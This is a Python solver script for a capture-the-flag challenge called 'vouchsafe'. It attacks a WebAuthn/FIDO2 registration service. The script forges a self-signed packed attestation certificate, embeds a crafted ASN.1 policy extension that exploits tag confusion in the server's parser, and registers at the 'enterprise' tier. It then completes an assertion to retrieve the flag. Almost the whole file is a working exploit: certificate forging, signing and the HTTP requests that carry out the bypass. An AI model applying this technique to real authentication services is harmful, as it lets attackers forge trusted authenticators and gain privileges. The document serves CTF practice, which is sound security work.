#!/usr/bin/env python3
"""
Solver for vouchsafe (H7 Passport WebAuthn/FIDO2 Attestation Bypass)
Challenge: vouchsafe
Target: https://web-d83cf58e26d1e625.web.h7tex.com
Vulnerability: ASN.1 parser tag confusion / relative offset miscalculation in enterprise policy extension.
"""

import sys
import os
import re
import json
import base64
import hashlib
import datetime
import argparse
import requests
from cryptography import x509
from cryptography.x509.oid import NameOID
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import ec

sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), "..", "..")))
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), "..", "..", "vouchsafe-handout")))

from passport_client import b64u, cbor, cose_ec2, build_auth_data


def solve(target_url: str):
    print(f"[*] Solving vouchsafe against {target_url}...")
    s = requests.Session()

    # 1. Register begin
    begin = s.get(target_url + "/register/begin").json()
    rp_id, origin = begin["rpId"], begin["origin"]
    challenge = base64.urlsafe_b64decode(begin["challenge"] + "==")
    print(f"[+] rpId: {rp_id}, origin: {origin}, credits: {begin.get('credits')}")

    # Generate random AAGUID not in MDS to use legacy self-enrolled path
    aaguid = os.urandom(16)
    aaguids_der = bytes.fromhex("30120410") + aaguid

    # Tag 7 is FALSE (0x87 01 00), Tag 8 is TRUE (0x88 01 01)
    tag7_der = bytes([0x87, 0x01, 0x00])
    tag8_der = bytes([0x88, 0x01, 0x01])

    ver_der = bytes([0x02, 0x01, 0x01])
    cnt_der = bytes([0x02, 0x01, 0x01])

    policy_body = ver_der + cnt_der + aaguids_der + tag7_der + tag8_der
    policy_der = bytes([0x30, len(policy_body)]) + policy_body

    att_key = ec.generate_private_key(ec.SECP256R1())
    subject = issuer = x509.Name([
        x509.NameAttribute(NameOID.COMMON_NAME, u"Enterprise Authenticator Leaf"),
    ])

    ext_fido = x509.extensions.UnrecognizedExtension(
        x509.ObjectIdentifier("1.3.6.1.4.1.45724.1.1.4"),
        bytes([0x04, 0x10]) + aaguid,
    )
    ext_policy = x509.extensions.UnrecognizedExtension(
        x509.ObjectIdentifier("1.3.6.1.4.1.61387.2.7.4"),
        policy_der,
    )

    cert = x509.CertificateBuilder().subject_name(
        subject
    ).issuer_name(
        issuer
    ).public_key(
        att_key.public_key()
    ).serial_number(
        x509.random_serial_number()
    ).not_valid_before(
        datetime.datetime.now(datetime.timezone.utc) - datetime.timedelta(days=1)
    ).not_valid_after(
        datetime.datetime.now(datetime.timezone.utc) + datetime.timedelta(days=10)
    ).add_extension(ext_fido, critical=False).add_extension(ext_policy, critical=False).sign(att_key, hashes.SHA256())

    cert_der = cert.public_bytes(serialization.Encoding.DER)

    cred_key = ec.generate_private_key(ec.SECP256R1())
    cred_id = os.urandom(16)
    cose = cose_ec2(cred_key.public_key())

    client_data = json.dumps({
        "type": "webauthn.create",
        "challenge": b64u(challenge),
        "origin": origin,
    }, separators=(",", ":")).encode()
    client_hash = hashlib.sha256(client_data).digest()

    flags = 0x01 | 0x04 | 0x40
    auth_data = build_auth_data(rp_id, flags, aaguid, cred_id, cose)

    signature = att_key.sign(auth_data + client_hash, ec.ECDSA(hashes.SHA256()))
    att = {
        "fmt": "packed",
        "attStmt": {
            "alg": -7,
            "sig": signature,
            "x5c": [cert_der],
        },
        "authData": auth_data,
    }

    # 2. Register finish
    finish = s.post(target_url + "/register/finish", json={
        "clientDataJSON": b64u(client_data),
        "attestationObject": b64u(cbor(att)),
    })
    print(f"[*] /register/finish: {finish.status_code} {finish.text}")
    res_reg = finish.json()
    if res_reg.get("tier") != "enterprise":
        print("[-] Registration did not achieve enterprise tier.")
        return None

    # 3. Assert begin
    abegin = s.get(target_url + "/assert/begin").json()
    achallenge = base64.urlsafe_b64decode(abegin["challenge"] + "==")

    # 4. Assert finish
    aclient = json.dumps({
        "type": "webauthn.get",
        "challenge": b64u(achallenge),
        "origin": origin,
    }, separators=(",", ":")).encode()
    aclient_hash = hashlib.sha256(aclient).digest()

    aflags = 0x01 | 0x04
    rp_hash = hashlib.sha256(rp_id.encode()).digest()
    auth_assert = rp_hash + bytes([aflags]) + b"\x00\x00\x00\x00"
    asig = cred_key.sign(auth_assert + aclient_hash, ec.ECDSA(hashes.SHA256()))

    afinish = s.post(target_url + "/assert/finish", json={
        "credentialId": b64u(cred_id),
        "clientDataJSON": b64u(aclient),
        "authenticatorData": b64u(auth_assert),
        "signature": b64u(asig),
    })
    print(f"[*] /assert/finish: {afinish.status_code} {afinish.text}")
    res_assert = afinish.json()
    flag = res_assert.get("flag")
    if flag:
        print(f"[!] SUCCESS! Flag: {flag}")
        return flag
    return None


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Solver for vouchsafe")
    parser.add_argument("--url", default="https://web-d83cf58e26d1e625.web.h7tex.com", help="Target URL")
    args = parser.parse_args()

    solve(args.url)
